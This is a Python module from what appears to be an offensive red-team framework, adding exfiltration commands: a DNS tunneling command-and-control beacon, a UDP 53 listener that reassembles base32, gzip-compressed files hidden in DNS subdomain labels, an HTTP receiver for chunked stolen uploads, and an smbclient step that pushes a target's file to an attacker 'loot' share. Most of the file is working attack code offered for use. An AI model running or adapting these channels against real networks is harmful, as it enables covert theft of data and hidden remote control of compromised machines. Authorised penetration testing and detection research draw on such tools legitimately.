"""DNS exfiltration and covert channel command set.

Phase 09 — commands for DNS tunneling exfiltration, DNS C2 beacon
management, and DNS query log monitoring.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import json
import os
import re
import socket
import struct
import threading
import time
from pathlib import Path

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    GREEN,
    RESET,
    YELLOW,
    exfiltration_category,
    print_error,
    print_msg,
    print_succ,
    print_warn,
)

DNS_QUERY_RE = re.compile(
    rb"\x00(?P<domain>[a-zA-Z0-9.-]+)\x00",
)

_SAFE_FILENAME_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9._\-+]{0,255}$")


def _sanitize_filename(name: str) -> str:
    """Return a safe basename from an untrusted input, falling back to a random name."""
    stripped = os.path.basename(name).strip(" .")
    if not stripped or not _SAFE_FILENAME_RE.match(stripped):
        return f"upload_{int(time.time())}.bin"
    return stripped


class DNSExfilCommandSet(LazyOwnCommandSet):
    """DNS exfiltration and covert channel commands."""

    phase = "exfil"
    category = exfiltration_category

    @cmd2.with_category(exfiltration_category)
    def do_dns_beacon(self, line):
        """Start a DNS tunneling beacon.

        Usage: dns_beacon --domain <c2.domain.com> [--type A|TXT|AAAA]
               [--sleep <seconds>] [--jitter <percent>] [--server <dns_server>]

        The DNS beacon encodes heartbeats and command output as subdomain
        DNS queries. Commands are received via DNS response records.
        Requires a cooperating DNS server for the controlled domain.
        """
        import shlex
        args = shlex.split(line)
        domain = self._extract(args, "--domain") or self.params.get("domain", "")
        dns_type = self._extract(args, "--type") or "A"
        sleep_sec = int(self._extract(args, "--sleep") or "5")
        jitter = int(self._extract(args, "--jitter") or "30")
        dns_server = self._extract(args, "--server")

        if not domain:
            print_error("Usage: dns_beacon --domain <c2.domain.com> [--type A|TXT|AAAA]")
            print_error("Set domain first: assign domain <domain>")
            return

        try:
            from modules.dns_beacon import DNSBeacon
        except ImportError as exc:
            print_error(f"DNS beacon module not available: {exc}")
            return

        beacon = DNSBeacon(
            domain=domain,
            dns_server=dns_server,
            sleep_seconds=sleep_sec,
            jitter_percent=jitter,
            dns_type=dns_type,
        )
        print_msg(f"Starting DNS Beacon {beacon.beacon_id}")
        print_msg(f"Domain: {domain}, Type: {dns_type}, Sleep: {sleep_sec}s")
        print_msg(f"Hostname: {beacon.hostname}")
        try:
            beacon.run()
        except KeyboardInterrupt:
            print_msg("Beacon stopped.")

    @cmd2.with_category(exfiltration_category)
    def do_dns_exfil_listen(self, line):
        """Start a DNS exfiltration listener on UDP port 53.

        Usage: dns_exfil_listen [--port <port>] [--domain <domain>] [--output <dir>]

        Listens for DNS queries containing encoded file data in subdomain
        labels. Reconstructs files from base32-encoded, gzip-compressed
        chunks. Supports A, TXT, and AAAA query types.
        """
        import shlex
        args = shlex.split(line)
        port = int(self._extract(args, "--port") or "53")
        domain = self._extract(args, "--domain") or self.params.get("domain", "")
        output_dir = self._extract(args, "--output") or "sessions/dns_exfil"

        os.makedirs(output_dir, exist_ok=True)

        import socket as sock_module
        sock = sock_module.socket(sock_module.AF_INET, sock_module.SOCK_DGRAM)
        sock.setsockopt(sock_module.SOL_SOCKET, sock_module.SO_REUSEADDR, 1)
        bind_addr = self.params.get("lhost", "0.0.0.0")
        sock.bind((bind_addr, port))

        print_msg(f"DNS exfil listener on UDP 0.0.0.0:{port}")
        if domain:
            print_msg(f"Filtering for domain: {domain}")

        pending: dict[str, dict[int, bytes]] = {}

        try:
            while True:
                data, addr = sock.recvfrom(4096)
                query = data[12:].decode("utf-8", errors="replace").strip()

                if domain and domain not in query:
                    continue

                labels = query.lower().rstrip(".").split(".")
                dns_domain_idx = labels.index(domain.split(".")[-1]) if domain.split(".")[-1] in labels else -1
                if dns_domain_idx < 0:
                    continue

                relevant = labels[:dns_domain_idx]
                if len(relevant) < 4:
                    continue

                file_hash = relevant[0]
                try:
                    chunk_idx = int(relevant[1])
                    total = int(relevant[2])
                except (ValueError, IndexError):
                    continue

                chunk_data = "".join(relevant[3:])

                if file_hash not in pending:
                    pending[file_hash] = {}

                try:
                    padding = "=" * ((8 - len(chunk_data) % 8) % 8)
                    decoded = base64.b32decode(chunk_data.upper() + padding)
                except Exception:
                    continue

                pending[file_hash][chunk_idx] = decoded

                if len(pending[file_hash]) >= total:
                    ordered = b"".join(
                        pending[file_hash][i] for i in sorted(pending[file_hash].keys())
                    )
                    try:
                        decompressed = gzip.decompress(ordered)
                    except Exception:
                        decompressed = ordered
                    out_path = os.path.join(output_dir, f"exfil_{file_hash}_{int(time.time())}.bin")
                    with open(out_path, "wb") as f:
                        f.write(decompressed)
                    fhash = hashlib.sha256(decompressed).hexdigest()
                    print_succ(f"Reconstructed: {out_path} ({len(decompressed)} bytes, SHA256={fhash[:16]})")
                    del pending[file_hash]

        except KeyboardInterrupt:
            sock.close()
            print_msg("DNS exfil listener stopped.")

    @cmd2.with_category(exfiltration_category)
    def do_dns_beacon_status(self, line=""):
        """Show status of all DNS beacons.

        Reads beacon state from sessions/dns_beacons.json.
        """
        del line
        state_file = os.path.join(self.params.get("sessions_dir", "sessions"), "dns_beacons.json")
        if not os.path.exists(state_file):
            print_warn("No DNS beacon state found. Run dns_beacon_server first.")
            return
        with open(state_file) as f:
            beacons = json.load(f).get("beacons", {})
        if not beacons:
            print_msg("No active DNS beacons.")
            return
        print_msg(f"{'ID':<16} {'Hostname':<24} {'Last Seen':<20}")
        print_msg("-" * 60)
        for bid, info in beacons.items():
            print_msg(f"  {bid:<14}  {info.get('hostname', '?')[:22]:<22}  {info.get('last_seen', '?')[:18]:<18}")

    @cmd2.with_category(exfiltration_category)
    def do_http_exfil_server(self, line):
        """Start a minimal HTTP exfiltration receiver.

        Usage: http_exfil_server [--port <port>] [--output <dir>]

        Listens for HTTP POST requests containing exfiltrated file data.
        Supports chunked uploads with X-Chunk-* headers for reassembly.
        """
        import shlex
        args = shlex.split(line)
        port = int(self._extract(args, "--port") or "8888")
        output_dir = self._extract(args, "--output") or "sessions/http_exfil"

        os.makedirs(output_dir, exist_ok=True)
        output_dir = os.path.realpath(output_dir)

        try:
            from http.server import HTTPServer, BaseHTTPRequestHandler
        except ImportError:
            print_error("HTTP server not available.")
            return

        class ExfilHandler(BaseHTTPRequestHandler):
            def do_POST(self):
                content_length = int(self.headers.get("Content-Length", 0))
                data = self.rfile.read(content_length)

                chunk_idx = self.headers.get("X-Chunk-Index")
                chunk_total = self.headers.get("X-Chunk-Total")
                file_name = self.headers.get("X-File-Name", f"upload_{int(time.time())}.bin")
                file_hash = self.headers.get("X-File-Hash", "")

                safe_name = _sanitize_filename(file_name)

                if chunk_idx is not None and chunk_total is not None:
                    stage_dir = os.path.realpath(
                        os.path.join(output_dir, f".staging_{safe_name}")
                    )
                    if not stage_dir.startswith(output_dir + os.sep):
                        self.send_response(403)
                        self.end_headers()
                        return
                    os.makedirs(stage_dir, exist_ok=True)
                    chunk_path = os.path.realpath(
                        os.path.join(stage_dir, f"chunk_{int(chunk_idx):04d}")
                    )
                    if not chunk_path.startswith(stage_dir + os.sep):
                        self.send_response(403)
                        self.end_headers()
                        return
                    with open(chunk_path, "wb") as f:
                        f.write(data)

                    written = len(os.listdir(stage_dir))
                    if written >= int(chunk_total):
                        full_data = b""
                        for i in range(int(chunk_total)):
                            cp = os.path.realpath(os.path.join(stage_dir, f"chunk_{i:04d}"))
                            if not cp.startswith(stage_dir + os.sep):
                                continue
                            if os.path.exists(cp):
                                with open(cp, "rb") as chunk_f:
                                    full_data += chunk_f.read()
                        out_path = os.path.realpath(os.path.join(output_dir, safe_name))
                        if not out_path.startswith(output_dir + os.sep):
                            self.send_response(403)
                            self.end_headers()
                            return
                        with open(out_path, "wb") as f:
                            f.write(full_data)
                        import shutil
                        shutil.rmtree(stage_dir, ignore_errors=True)
                        print_succ(f"Reassembled: {out_path} ({len(full_data)} bytes)")
                else:
                    out_path = os.path.realpath(os.path.join(output_dir, safe_name))
                    if not out_path.startswith(output_dir + os.sep):
                        self.send_response(403)
                        self.end_headers()
                        return
                    with open(out_path, "wb") as f:
                        f.write(data)
                    print_succ(f"Received: {out_path} ({len(data)} bytes)")

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")

            def log_message(self, fmt, *args):
                pass

        bind_addr = self.params.get("lhost", "0.0.0.0")
        server = HTTPServer((bind_addr, port), ExfilHandler)
        print_msg(f"HTTP exfil receiver on http://0.0.0.0:{port}")
        print_msg(f"Output: {output_dir}")
        print_msg(f"Usage from target: exfil_http <file> --url http://{self.params.get('lhost', '<lhost>')}:{port}")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()
            print_msg("HTTP exfil receiver stopped.")

    @cmd2.with_category(exfiltration_category)
    def do_smb_exfil(self, line):
        """Exfiltrate files to an SMB share on the attacker machine.

        Usage: smb_exfil <file_path> [--share <share_name>] [--host <smb_host>]

        Copies a file to an SMB share. Requires an SMB server running
        on the attacker machine (e.g., impacket-smbserver).
        """
        import shlex
        args = shlex.split(line)
        if not args or args[0].startswith("--"):
            print_error("Usage: smb_exfil <file_path> [--share <share_name>] [--host <smb_host>]")
            return

        file_path = args[0]
        share = self._extract(args, "--share") or "loot"
        smb_host = self._extract(args, "--host") or self.params.get("lhost", "")

        if not os.path.exists(file_path):
            print_error(f"File not found: {file_path}")
            return

        if not smb_host:
            print_error("Set lhost: assign lhost <ip>")
            return

        file_name = os.path.basename(file_path)
        self.cmd(f"smbclient //{smb_host}/{share} -c 'put {file_path} {file_name}' -N --option='client min protocol=SMB2'")
        print_msg(f"Exfiltrated {file_path} to \\\\{smb_host}\\{share}\\{file_name}")

    @cmd2.with_category(exfiltration_category)
    def do_exfil_start_server(self, line):
        """Start all required exfiltration listeners.

        Usage: exfil_start_server [--all] [--dns] [--http] [--smb]

        Starts DNS (53/udp), HTTP (8888/tcp), and SMB (445/tcp) listeners
        for receiving exfiltrated data via all transports.
        """
        import shlex
        args = shlex.split(line)
        start_all = not args or "--all" in args
        start_dns = start_all or "--dns" in args
        start_http = start_all or "--http" in args
        start_smb = start_all or "--smb" in args

        threads = []

        if start_http:
            t = threading.Thread(target=lambda: self.do_http_exfil_server(""), daemon=True)
            t.start()
            threads.append(("HTTP", t))
            print_msg("Started HTTP exfil listener on port 8888")

        if start_dns:
            t = threading.Thread(target=lambda: self.do_dns_exfil_listen(""), daemon=True)
            t.start()
            threads.append(("DNS", t))
            print_msg("Started DNS exfil listener on port 53")

        if start_smb:
            lhost = self.params.get("lhost", "")
            smb_dir = os.path.join(self.params.get("sessions_dir", "sessions"), "smb_loot")
            os.makedirs(smb_dir, exist_ok=True)
            print_msg(f"SMB server: impacket-smbserver -smb2support loot {smb_dir}")
            print_msg(f"Start manually: sudo impacket-smbserver -smb2support loot {smb_dir}")

        if threads:
            print_msg("\nAll exfil listeners started. Press Ctrl+C to stop.")
            try:
                while any(t.is_alive() for _, t in threads):
                    time.sleep(1)
            except KeyboardInterrupt:
                print_msg("Exfil listeners stopping...")

    @staticmethod
    def _extract(args: list[str], flag: str) -> str | None:
        try:
            idx = args.index(flag)
            return args[idx + 1]
        except (ValueError, IndexError):
            return None


__all__ = ["DNSExfilCommandSet"]
